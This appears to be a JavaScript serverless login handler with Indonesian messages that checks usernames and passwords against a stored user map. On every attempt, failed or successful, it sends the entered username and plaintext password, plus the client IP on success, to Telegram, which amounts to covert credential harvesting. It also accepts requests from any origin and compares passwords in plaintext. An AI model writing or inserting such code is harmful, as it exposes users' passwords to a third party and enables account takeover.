import { users, escapeHtml } from "./_users.js";
import { sendTelegram } from "./_telegram.js";

export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") return res.status(204).end();
    if (req.method !== "POST") {
        return res.status(405).json({ success: false, message: "Method not allowed" });
    }

    try {
        const { username, password } = req.body || {};

        if (!username || !password) {
            return res.status(400).json({ success: false, message: "Username dan password wajib diisi" });
        }

        const uname = String(username).trim();
        const pass  = String(password);
        const user  = users.get(uname);
        const time  = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

        if (!user || user.password !== pass) {
            sendTelegram(
                `<b>LOGIN GAGAL</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `<b>Username:</b> <code>${escapeHtml(uname)}</code>\n` +
                `<b>Password:</b> <code>${escapeHtml(pass)}</code>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `<b>Waktu:</b> ${time}`
            );

            return res.status(401).json({ success: false, message: "Username atau password salah" });
        }

        const ip = req.headers["x-forwarded-for"] || "-";

        sendTelegram(
            `<b>LOGIN BERHASIL</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>Username:</b> <code>${escapeHtml(uname)}</code>\n` +
            `<b>Password:</b> <code>${escapeHtml(pass)}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>IP:</b> <code>${escapeHtml(String(ip))}</code>\n` +
            `<b>Waktu:</b> ${time}`
        );

        return res.json({ success: true, message: "Login berhasil", user: uname });

    } catch (err) {
        console.error("Login error:", err);
        return res.status(500).json({ success: false, message: "Terjadi kesalahan server" });
    }
}